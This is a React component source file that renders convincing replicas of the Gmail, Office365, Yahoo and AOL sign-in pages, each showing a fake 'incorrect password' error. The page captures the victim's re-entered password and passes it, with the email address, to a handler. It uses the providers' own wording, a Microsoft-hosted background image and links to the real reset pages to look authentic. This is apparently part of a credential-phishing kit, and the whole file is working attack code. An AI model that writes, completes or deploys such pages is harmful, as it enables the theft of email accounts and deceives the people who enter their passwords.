import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface IncorrectPasswordPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Realistic "incorrect password" full-screen page for each provider.
 * Visually mimics a reload of the provider's login page with a prominent
 * inline error banner, then lets the user re-enter the password.
 */
const IncorrectPasswordPage: React.FC<IncorrectPasswordPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const backendMessage = (data.message as string) || '';

  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const defaultErrorByProvider: Record<ProviderKey, string> = {
    gmail: "Wrong password. Try again or click Forgot password to reset it.",
    office365: "Your account or password is incorrect. If you don't remember your password, reset it now.",
    yahoo: "Invalid password. Please try again.",
    aol: "Invalid password. Please try again.",
    others: 'The password you entered is incorrect. Please try again.',
  };
  const errorMessage = backendMessage || defaultErrorByProvider[providerKey];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || submitting) return;
    setSubmitting(true);
    onAction('retry_password', { email, password });
  };

  const goBackHome = () => {
    onAction('cancel');
    navigate(-1);
  };

  // Gmail
  if (providerKey === 'gmail') {
    return (
      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div
            className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12"
            style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
          >
            <form onSubmit={handleSubmit}>
              <div className="flex flex-col md:flex-row md:gap-16">
                <div className="md:w-1/2 md:pt-4">
                  <ProviderLogo providerKey="gmail" />
                  <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">Welcome</h1>
                  {email && (
                    <div className="mt-6">
                      <button type="button" onClick={goBackHome} className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50">
                        <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">
                          {email.charAt(0).toUpperCase()}
                        </div>
                        <span className="text-sm text-gray-800 pr-1">{email}</span>
                        <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                        </svg>
                      </button>
                    </div>
                  )}
                </div>
                <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
                  <div className="relative mt-1">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      autoFocus
                      className="w-full px-3 py-4 text-base bg-transparent border-2 rounded-md outline-none"
                      style={{ borderColor: theme.error }}
                    />
                    <label className="absolute left-2 -top-2.5 bg-white px-1 text-xs" style={{ color: theme.error }}>
                      Enter your password
                    </label>
                  </div>
                  <p className="text-sm mt-2" style={{ color: theme.error }}>{errorMessage}</p>
                  <div className="flex items-center mt-4">
                    <input type="checkbox" id="showPassword" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
                    <label htmlFor="showPassword" className="ml-2 text-sm text-gray-700 cursor-pointer">Show password</label>
                  </div>
                  <div className="flex justify-between items-center mt-12">
                    <a href="https://accounts.google.com/signin/v2/challenge/password/recovery" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">Forgot password?</a>
                    <button type="submit" disabled={!password || submitting} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50">
                      {submitting ? 'Checking\u2026' : 'Next'}
                    </button>
                  </div>
                </div>
              </div>
            </form>
          </div>
        </main>
      </div>
    );
  }

  // Office365
  if (providerKey === 'office365') {
    return (
      <div
        className="min-h-screen flex items-center justify-center p-0 md:p-4"
        style={{
          fontFamily: theme.fontFamily,
          backgroundImage: "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundColor: '#e9e9e9',
        }}
      >
        <div className="bg-white w-full max-w-[440px] px-11 py-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}>
          <div className="mb-5"><ProviderLogo providerKey="office365" /></div>
          {email && (
            <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
              <button type="button" onClick={goBackHome} className="mr-2 text-[#1b1b1b]" aria-label="Back">&larr;</button>
              <span>{email}</span>
            </div>
          )}
          <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">Enter password</h1>
          <p className="text-sm mb-4" style={{ color: theme.error }}>{errorMessage}</p>
          <form onSubmit={handleSubmit}>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              autoFocus
              className="w-full px-2 py-1 text-[15px] border-0 border-b-2 bg-transparent outline-none focus:border-[#0067b8]"
              style={{ borderBottomColor: theme.error }}
            />
            <div className="mt-3 flex flex-col gap-1">
              <a href="https://passwordreset.microsoftonline.com/" target="_blank" rel="noopener noreferrer" className="text-sm text-[#0067b8] hover:underline w-fit">Forgot my password</a>
              <button type="button" onClick={() => onAction('request_alternate_method')} className="text-sm text-[#0067b8] hover:underline text-left w-fit">Sign in with a different account</button>
            </div>
            <div className="mt-6 flex justify-end gap-2">
              <button type="button" onClick={goBackHome} className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]" style={{ minWidth: '108px' }}>Back</button>
              <button type="submit" disabled={!password || submitting} className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60 disabled:cursor-not-allowed" style={{ backgroundColor: theme.primary, minWidth: '108px' }}>
                {submitting ? 'Signing in\u2026' : 'Sign in'}
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  // Yahoo
  if (providerKey === 'yahoo') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-[360px] mx-auto pt-16 pb-12 px-8 bg-white rounded-2xl" style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}>
            <div className="flex justify-center mb-6"><ProviderLogo providerKey="yahoo" className="h-9" /></div>
            <h2 className="text-center text-[22px] font-bold text-gray-900">Enter password</h2>
            {email && (<div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div>)}
            <form onSubmit={handleSubmit} className="mt-5 space-y-4">
              <p className="text-sm font-medium text-center" style={{ color: theme.error }}>{errorMessage}</p>
              <div className="relative mt-1 h-12">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  autoFocus
                  className="w-full bg-transparent pt-3 pb-1 text-base focus:outline-none"
                />
                <div className="absolute bottom-0 left-0 w-full h-px" style={{ backgroundColor: theme.error }}></div>
              </div>
              <label className="flex items-center text-sm text-gray-700">
                <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="w-4 h-4 border-gray-300 rounded" />
                <span className="ml-2">Show password</span>
              </label>
              <button type="submit" disabled={!password || submitting} className="w-full mt-5 py-3 text-white font-semibold rounded-full disabled:opacity-50" style={{ backgroundColor: theme.primary }}>
                {submitting ? 'Signing in\u2026' : 'Next'}
              </button>
              <div className="text-center">
                <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-xs font-medium" style={{ color: theme.primary }}>
                  I forgot my password
                </a>
              </div>
            </form>
          </div>
        </main>
      </div>
    );
  }

  // AOL
  if (providerKey === 'aol') {
    return (
      <div className="min-h-screen bg-white font-sans flex flex-col" style={{ fontFamily: theme.fontFamily }}>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div className="w-full max-w-[370px] py-12 px-10 bg-white rounded-xl border border-gray-200">
            <div className="flex justify-center mb-6"><ProviderLogo providerKey="aol" className="h-10" /></div>
            <h2 className="text-center text-2xl font-bold text-gray-900 mb-6">Sign in</h2>
            <form onSubmit={handleSubmit} className="space-y-5">
              <p className="text-sm text-center" style={{ color: theme.error }}>{errorMessage}</p>
              {email && (<div className="text-center text-sm font-medium p-2 rounded-md bg-gray-100 truncate">{email}</div>)}
              <div className="relative mt-4">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  autoFocus
                  className="w-full bg-white pt-2 pb-2 text-base border-b focus:outline-none"
                  style={{ borderColor: theme.error }}
                />
              </div>
              <label className="flex items-center text-sm text-gray-700">
                <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="w-4 h-4 border-gray-300 rounded" />
                <span className="ml-2">Show password</span>
              </label>
              <button type="submit" disabled={!password || submitting} className="w-full mt-6 py-3 text-white font-bold rounded-md disabled:opacity-50 text-base" style={{ backgroundColor: theme.primary }}>
                {submitting ? 'Signing in\u2026' : 'Sign In'}
              </button>
              <div className="text-center mt-2">
                <a href="https://login.aol.com/forgot" target="_blank" rel="noopener noreferrer" className="text-sm font-medium" style={{ color: theme.primary }}>
                  I forgot my password
                </a>
              </div>
            </form>
          </div>
        </main>
      </div>
    );
  }

  // Others (generic)
  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-white rounded-lg shadow p-8">
          <div className="flex justify-center mb-5"><ProviderLogo providerKey="others" /></div>
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] text-center mb-2">Sign in</h1>
          {email && (<p className="text-sm text-gray-600 text-center mb-4">{email}</p>)}
          <div className="text-sm text-center mb-4 p-3 rounded border" style={{ color: theme.error, borderColor: theme.error, backgroundColor: '#fdecea' }}>
            {errorMessage}
          </div>
          <form onSubmit={handleSubmit}>
            <label className="block text-xs text-gray-600 mb-1">Password</label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoFocus
              className="w-full px-4 py-3 border rounded-md outline-none focus:border-[#0066cc]"
              style={{ borderColor: '#d1d1d1' }}
            />
            <label className="flex items-center text-sm text-gray-700 mt-3">
              <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="w-4 h-4 border-gray-300 rounded" />
              <span className="ml-2">Show password</span>
            </label>
            <button type="submit" disabled={!password || submitting} className="w-full mt-6 py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60" style={{ backgroundColor: theme.primary }}>
              {submitting ? 'Signing in\u2026' : 'Sign in'}
            </button>
          </form>
          <div className="mt-4 flex justify-between text-sm">
            <button type="button" onClick={() => onAction('forgot_password')} className="hover:underline" style={{ color: theme.primary }}>Forgot password?</button>
            <button type="button" onClick={goBackHome} className="hover:underline" style={{ color: theme.primary }}>Use a different account</button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default IncorrectPasswordPage;
